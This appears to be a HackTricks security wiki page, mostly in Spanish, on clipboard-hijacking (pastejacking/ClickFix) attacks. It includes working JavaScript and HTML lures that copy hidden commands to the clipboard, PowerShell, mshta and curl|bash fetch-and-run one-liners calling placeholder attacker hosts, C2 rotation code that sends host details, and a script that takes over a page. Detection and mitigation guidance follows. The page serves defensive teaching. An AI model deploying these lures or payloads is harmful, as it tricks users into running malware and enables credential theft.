# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues algo que no copiaste tú mismo." – consejo antiguo pero aún válido

## Visión general

Clipboard hijacking – también conocido como *pastejacking* – abusa del hecho de que los usuarios rutinariamente copian y pegan comandos sin inspeccionarlos. Una página web maliciosa (o cualquier contexto con soporte de JavaScript como una aplicación Electron o Desktop) coloca programáticamente texto controlado por el atacante en el portapapeles del sistema. Normalmente, mediante instrucciones de ingeniería social cuidadosamente elaboradas, se anima a las víctimas a presionar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o a abrir un terminal y *pegar* el contenido del portapapeles, ejecutando inmediatamente comandos arbitrarios.

Debido a que **no se descarga ningún archivo ni se abre ningún attachment**, la técnica evade la mayoría de los controles de seguridad de correo electrónico y contenido web que monitorean attachments, macros o la ejecución directa de comandos. El ataque es por ello popular en campañas de phishing que distribuyen familias de malware commodity como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Botones de “Copy” forzados y payloads ocultos (macOS one-liners)

Algunos macOS infostealers clonan sitios de instaladores (p. ej., Homebrew) y **forzan el uso de un botón “Copy”** para que los usuarios no puedan resaltar solo el texto visible. La entrada del portapapeles contiene el comando de instalación esperado más un payload Base64 añadido al final (p. ej., `...; echo <b64> | base64 -d | sh`), de modo que un solo pegado ejecuta ambos mientras la interfaz oculta la etapa extra.

## Prueba de concepto en JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. Un JavaScript inyectado **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que guarda silenciosamente un comando de una sola línea de PowerShell codificado en Base64 en el portapapeles.
3. Las instrucciones HTML le dicen a la víctima: *“Presione **Win + R**, pegue el comando y presione Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej. tarea programada) – ejecutando finalmente NetSupport RAT / Latrodectus / Lumma Stealer.

### Ejemplo de cadena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) vía **curl.exe**, los descifra usando una clave XOR rotatoria `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el downloader JScript dentro de **cscript.exe**
3. Obtiene un payload MSI → coloca `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** lanza un script PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos, y finalmente ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algunas campañas ClickFix omiten por completo las descargas de archivos e instruyen a las víctimas a pegar un one‑liner que obtiene y ejecuta JavaScript vía WSH, lo persiste y rota el C2 diariamente. Ejemplo de cadena observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para evadir la inspección superficial.
- JavaScript se persiste vía un Startup LNK (WScript/CScript) y selecciona el C2 según el día actual – permitiendo una rápida rotación de dominios.

Fragmento JS mínimo usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La etapa siguiente comúnmente despliega un loader que establece persistence y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado hardcoded y chunking traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistencia en macOS de la ejecución inicial
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de que se cierre el terminal, reduciendo artefactos visibles.

In-place page takeover en sitios comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideas de detección y caza específicas para señuelos estilo IUAM

- Web: Páginas que vinculan la Clipboard API a widgets de verificación; discrepancia entre el texto mostrado y la carga del portapapeles; ramificación por `navigator.userAgent`; Tailwind + single-page replace en contextos sospechosos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- Endpoint macOS: Terminal/iTerm que lanza `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; tareas en segundo plano que sobreviven al cierre del terminal.
- Correlacionar `RunMRU` (historial Win+R) y escritos al portapapeles con la posterior creación de procesos de consola.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigaciones

1. Endurecimiento del navegador – deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir un gesto del usuario.
2. Concienciación de seguridad – enseñar a los usuarios a *escribir* comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrarios.
4. Controles de red – bloquear solicitudes salientes a dominios conocidos de pastejacking y malware C2.

## Trucos relacionados

* **Discord Invite Hijacking** a menudo abusa del mismo enfoque ClickFix después de atraer a usuarios a un servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referencias

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
